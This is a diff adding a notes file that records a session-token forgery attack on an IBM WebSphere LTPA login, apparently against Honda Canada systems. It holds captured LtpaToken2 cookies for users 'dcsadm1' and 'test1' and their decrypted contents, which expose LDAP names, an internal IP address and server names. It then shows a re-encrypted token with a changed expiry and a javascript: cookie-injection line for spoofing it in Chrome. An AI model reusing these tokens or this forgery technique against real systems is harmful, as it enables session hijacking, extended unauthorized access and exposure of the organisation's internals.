@@ -1,0 +1,34 @@
+dcsadm1 userid
+--------------
+javascript:document.cookie="LtpaToken2=49GBEGK7rg6cQ+TdJed4wfu1z2+YzUtKOKMhzwTHj9jbKFW38hM+wU9H6W/fv6v8mJYgTlpjMo0gmxlrHsVUBxK/LvaAbeNhC/eMrSgoMq50UViya6iWdPIHImCQsgPgme7LhxFGVU6qfVMwdVmaUbK4Wl8VSzR9qEDGMi5t7ijuXkJ3u5cFcq3yhpp/qt1qc5QjAwtqAxWr5ng+88WQP1aXM2vBWdHkJa6efbN/hhsjxlu5KKTIpPu3b/MigCcAN92KbVU58pQTPgbv/AV0ZTBmAYbLraQ3s9B8fY58mxvOpzmHeJgaa7NOxiNYp78ZXJwmUnKoLK0zQ7WZFx6p2GveQvRV7Q7FOXUX24eWMhfIj9ZWcoDiYk2NEUyRU6Y9gyA6gVigMY+pS5l7KI3klg=="
+
+dcsadm1 Decrypted: 
+-------------------
+PlainToken=expire:1441807700000$u:user\:207.130.168.100\:389/CN=dcsadm1,OU=User Management,DC=chtdmn,DC=honda,DC=ca%1441807700000%3LUiISJtl9fFiuooRKhN8hkzGpAxNi33YuajzDC1eF3RrU2gZkxGHxPe0wzBMsWrGrxWNzT8q6oRSAARHDuSE+dlSKS0sHfJpQvDme9XwOqs4jmKBoA/4ivULnE5aqBtpuGDV4dO3UWAHT6Hh+YQwkvGNk56YSC+b8sTnJFduLc=
+PlainToken=expire:1441807700000$u:user\:207.130.168.100\:389/CN=dcsadm1,OU=User Management,DC=chtdmn,DC=honda,DC=ca%1441807700000%3LUiISJtl9fFiuooRKhN8hkzGpAxNi33YuajzDC1eF3RrU2gZkxGHxPe0wzBMsWrGrxWNzT8q6oRSAARHDuSE+dlSKS0sHfJpQvDme9XwOqs4jmKBoA/4ivULnE5aqBtpuGDV4dO3UWAHT6Hh+YQwkvGNk56YSC+b8sTnJFduLc=
+
+dcsadm1 change Time and Encrypt again
+-------------------------------------
+javascript:document.cookie="LtpaToken2=ZIntLlhzOIc8y6XLo5ETTf5D7hNjmIcsEG8jB8loq/OCacvtOQZWzLQ5Ol1F0WBNDHm3suMBtfI07z1EeAMerGS6Q7KbpfVaV4bJmNb5htd3w5w7st2nc7gOH2JECpfnXkpU6PC1+upqiGwZZDdFmPzlHkk66GqrSqFqTCmouI6zIpbUqG1W1pkc84QgzijnOB4PMhMsJR9fEs2YThVQMlbDPdE3pAgrUt0nRWYqhvG8XuL9BDSU+95Ko05mDQ6okAr8YNrs7Zb2183N6+QpkCtF4L+50aIxKFyl49XtYJWC1xzRIgPSvuF9JKDvDMUsbAsqY9Vv6rHLvAZgbMA5BNAQUCYm0iV4i4ssSf8KOJe9rKzxN82P5Pq0AHiAviXqzye+A9+hRi88ZPAeZiSafA=="
+
+test1 userid
+------------
+javascript:document.cookie="LtpaToken2=+zfRaqwb/f+xaerRiTJN+VIyzw1Lj0QLioDoiY6SCDVkH7Nfizx7HeHBIjn+pJOtsTtwzwi/ryCdTzkVpkNnbnyGhz938wXmaSyoNpyJcqdtP7bTlp/93zw9u/j97SL5Ty4amkW4CoK8f6yUJlpGVwTMjrArzrCdk+UoLzAf1P8JrcaRPDhiU12IiCVtkEcO8zfjul9aUdy+UMdXLpi+n/MpZOEKN9wXTMOHcKTNCJUgtK/xJ1/DihaVsDnM0o1ntN2yk/5uGz5j3eMnATHk3cydtpo+4w2+8tN5L8E3zbZ332K5+KwVwcnsbRb9Hp2CwocLJFGinpuCaTWdz4zNZpa0uINy87AgU04T128PJKunJE07C2fK51tvmIdQjlxnr+KeShPN8ecwAAeB7vUQvrGDy+WfZfHfUg8/sXtBmF+G6LMW7Uc583Cu2hJU02/baVPuULOTIsIAVv4DJ8lFbycLb31yJLO07K/hpNwSSpb0o24SzPMtUSeDYXUExyJgwqKX1+w1C6wGTLPbQZMHOpfxRZerrdlk1cMXL6xGQ0wDIx1pKf6UKyk3+jriAHZFJI8gDD8raRhTvPK0jFglaSrhBLxQlT2Y/N6yhqLqjo+INTrpnTnJ2ub80M5FWP78DDB1kRz2UwMaaZ4DVdojGwx/w86uLDfHRRLX2b2mipg="
+                            LtpaToken2=+zfRaqwb/f+xaerRiTJN+VIyzw1Lj0QLioDoiY6SCDVkH7Nfizx7HeHBIjn+pJOtsTtwzwi/ryCdTzkVpkNnbnyGhz938wXmaSyoNpyJcqdtP7bTlp/93zw9u/j97SL5Ty4amkW4CoK8f6yUJlpGVwTMjrArzrCdk+UoLzAf1P8JrcaRPDhiU12IiCVtkEcO8zfjul9aUdy+UMdXLpi+n/MpZOEKN9wXTMOHcKTNCJUgtK/xJ1/DihaVsDnM0o1ntN2yk/5uGz5j3eMnATHk3cydtpo+4w2+8tN5L8E3zbZ332K5+KwVwcnsbRb9Hp2CwocLJFGinpuCaTWdz4zNZpa0uINy87AgU04T128PJKunJE07C2fK51tvmIdQjlxnr+KeShPN8ecwAAeB7vUQvrGDy+WfZfHfUg8/sXtBmF+G6LMW7Uc583Cu2hJU02/baVPuULOTIsIAVv4DJ8lFbycLb31yJLO07K/hpNwSSpb0o24SzPMtUSeDYXUExyJgwqKX1+w1C6wGTLPbQZMHOpfxRZerrdlk1cMXL6xGQ0wDIx1pKf6UKyk3+jriAHZFJI8gDD8raRhTvPK0jFglaSrhBLxQlT2Y/N6yhqLqjo+INTrpnTnJ2ub80M5FWP78DDB1kRz2UwMaaZ4DVdojGwx/w86uLDfHRRLX2b2mipg=	.honda.ca	/	Session	694	?
+
+test1 Decrypted
+---------------
+PlainToken=expire:1441811520000$host:Node01$java.naming.provider.url:corbaloc\:iiop\:Node01\:2812/WsnAdminNameService$port:8882$process.serverName:Cell01\:Node01\:wlServicesServer1$security.authMechOID:oid\:1.3.18.0.2.30.2$type:SOAP$u:user\:207.130.168.100\:389/CN=test1 user1,OU=Dealers,OU=User Management,DC=chtdmn,DC=honda,DC=ca%1441811520000%QOzylklvLA0+QZtqgLeCgaXDwGtWW0T3ZFNkSVTRhsGDkTSQ9j9oraiKWO5SoKUiOy6XDF+dDyWSUdJQs4b4evIq4yTZIuW/YJEpq4IFqpFZtuoswLMicdwbNbN4ZQCmJpddwooR+3U9CwFZusItub/5+F/cPKoEP6zSla94RPk=
+PlainToken=expire:1441811520000$host:Node01$java.naming.provider.url:corbaloc\:iiop\:Node01\:2812/WsnAdminNameService$port:8882$process.serverName:Cell01\:Node01\:wlServicesServer1$security.authMechOID:oid\:1.3.18.0.2.30.2$type:SOAP$u:user\:207.130.168.100\:389/CN=test1 user1,OU=Dealers,OU=User Management,DC=chtdmn,DC=honda,DC=ca%1441811520000%QOzylklvLA0+QZtqgLeCgaXDwGtWW0T3ZFNkSVTRhsGDkTSQ9j9oraiKWO5SoKUiOy6XDF+dDyWSUdJQs4b4evIq4yTZIuW/YJEpq4IFqpFZtuoswLMicdwbNbN4ZQCmJpddwooR+3U9CwFZusItub/5+F/cPKoEP6zSla94RPk=
+
+Changed Time
+------------
+expire:1441811650000$host:Node01$java.naming.provider.url:corbaloc\:iiop\:Node01\:2812/WsnAdminNameService$port:8882$process.serverName:Cell01\:Node01\:wlServicesServer1$security.authMechOID:oid\:1.3.18.0.2.30.2$type:SOAP$u:user\:207.130.168.100\:389/CN=test1 user1,OU=Dealers,OU=User Management,DC=chtdmn,DC=honda,DC=ca%1441811650000%QOzylklvLA0+QZtqgLeCgaXDwGtWW0T3ZFNkSVTRhsGDkTSQ9j9oraiKWO5SoKUiOy6XDF+dDyWSUdJQs4b4evIq4yTZIuW/YJEpq4IFqpFZtuoswLMicdwbNbN4ZQCmJpddwooR+3U9CwFZusItub/5+F/cPKoEP6zSla94RPk=
+
+Re-Encrypted Changed Time
+-------------------------
+PlainToken=mj2X8oL0gcF7eIRmzSbRhNa+jWkO3Pf2+m7VrNOG1jGGxLhBlwpL1V2nS6/bTHxDrrDgtD4hwKJjCLwqv81qTzk5uOjM2xQEGvxYNyq+n/WYOAS+Y0AqXp80EUVIdJU3wgDlyR3AwcM0FS8QYRYK3PCIs7lziu1ExkVKQ9TS8SXFNPieusMFNRlUN826Rb/eyhVYXGxQp/BhwhhUnV3111Kup1BwS/m5O3AqHn5W79QIQpGYHo1XHlGOmd7a+5Bc/+V+b17pK/Fq2FgEdHgt2c5goy5OmxHq3haaZevV49y58wfdSGmnVu4q4tAIZuZKfy2UVxCioqk3TGcCuKORuhnoIjBLdseLhyyrDXbnavByy3I4p9dhyCdz1SEV4C4NsOl+qdF/YNLH3Q5wBx3hl45MwLYoIP/HMGm9RR1Rgk5Cnb760pjYBZCGqpzzbC8saqQ0tXCvInrKHfoCzHZYIW4j7HmMi1/znqzNI+S/g1I17+eT8R3IntbMGhhcDuySlIHWk3DFWbsvCHXV8f2Bs9Y40xufsVIBgFd6ZKr9nxj49cajVGiVufda5FdFbQ8flhbFyW/4Ur1JPKqPpW0xNlGyTK3CBiFEDubOKdKNaW8HNtYRybaDG7BAvsvU7Wg9CZYQuQoBdf09Sj2Xms/H3naUFYHrEil5kVp/oWVPrAI=
+
+Spoof LTPA Token with changed time via URL in Chrome
+-----------------------------------------------------
+javascript:document.cookie="LtpaToken2=mj2X8oL0gcF7eIRmzSbRhNa+jWkO3Pf2+m7VrNOG1jGGxLhBlwpL1V2nS6/bTHxDrrDgtD4hwKJjCLwqv81qTzk5uOjM2xQEGvxYNyq+n/WYOAS+Y0AqXp80EUVIdJU3wgDlyR3AwcM0FS8QYRYK3PCIs7lziu1ExkVKQ9TS8SXFNPieusMFNRlUN826Rb/eyhVYXGxQp/BhwhhUnV3111Kup1BwS/m5O3AqHn5W79QIQpGYHo1XHlGOmd7a+5Bc/+V+b17pK/Fq2FgEdHgt2c5goy5OmxHq3haaZevV49y58wfdSGmnVu4q4tAIZuZKfy2UVxCioqk3TGcCuKORuhnoIjBLdseLhyyrDXbnavByy3I4p9dhyCdz1SEV4C4NsOl+qdF/YNLH3Q5wBx3hl45MwLYoIP/HMGm9RR1Rgk5Cnb760pjYBZCGqpzzbC8saqQ0tXCvInrKHfoCzHZYIW4j7HmMi1/znqzNI+S/g1I17+eT8R3IntbMGhhcDuySlIHWk3DFWbsvCHXV8f2Bs9Y40xufsVIBgFd6ZKr9nxj49cajVGiVufda5FdFbQ8flhbFyW/4Ur1JPKqPpW0xNlGyTK3CBiFEDubOKdKNaW8HNtYRybaDG7BAvsvU7Wg9CZYQuQoBdf09Sj2Xms/H3naUFYHrEil5kVp/oWVPrAI="
